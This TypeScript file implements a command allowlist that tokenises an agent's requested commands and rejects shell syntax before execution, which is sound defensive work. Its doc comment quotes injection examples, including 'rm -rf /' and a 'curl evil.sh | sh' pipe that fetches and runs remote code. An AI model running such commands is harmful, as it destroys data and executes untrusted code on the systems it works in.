export type CommandDecision = { allowed: true; argv: string[] } | { allowed: false; reason: string };

/**
 * Which commands a stage may run.
 *
 * Stage config names them (`pnpm build`, `pnpm test`) and this parses the agent's requested command
 * into argv before matching. Matching on the raw string would be a hole: `pnpm test; rm -rf /`,
 * `pnpm test && curl evil.sh | sh`, and `pnpm test $(whoami)` all start with an allowed prefix.
 *
 * So there is no shell. The command is tokenised here and handed to `execFile` as argv, which means
 * shell metacharacters are not "escaped" — they simply have no one to interpret them. Anything that
 * would need a shell to mean what it says is refused rather than quietly running.
 */

/** Characters that only mean something to a shell. Their presence means the agent expected one. */
const SHELL_METACHARACTERS = /[;&|><`$(){}[\]!#~*?\n\r\\]/;

export class CommandAllowlist {
    /** Each entry is the argv prefix a command must start with, e.g. `[['pnpm','test']]`. */
    private readonly prefixes: string[][];

    constructor(allowed: string[]) {
        this.prefixes = allowed.map(entry => entry.trim().split(/\s+/).filter(Boolean));
    }

    check(command: string): CommandDecision {
        if (SHELL_METACHARACTERS.test(command)) {
            return { allowed: false, reason: 'command contains shell syntax; commands run without a shell' };
        }

        const argv = command.trim().split(/\s+/).filter(Boolean);
        if (argv.length === 0) {
            return { allowed: false, reason: 'empty command' };
        }

        for (const prefix of this.prefixes) {
            if (prefix.length <= argv.length && prefix.every((token, i) => argv[i] === token)) {
                return { allowed: true, argv };
            }
        }

        return {
            allowed: false,
            reason: `command is not in this stage's allowlist (${this.prefixes.map(p => p.join(' ')).join(', ') || 'empty'})`,
        };
    }
}
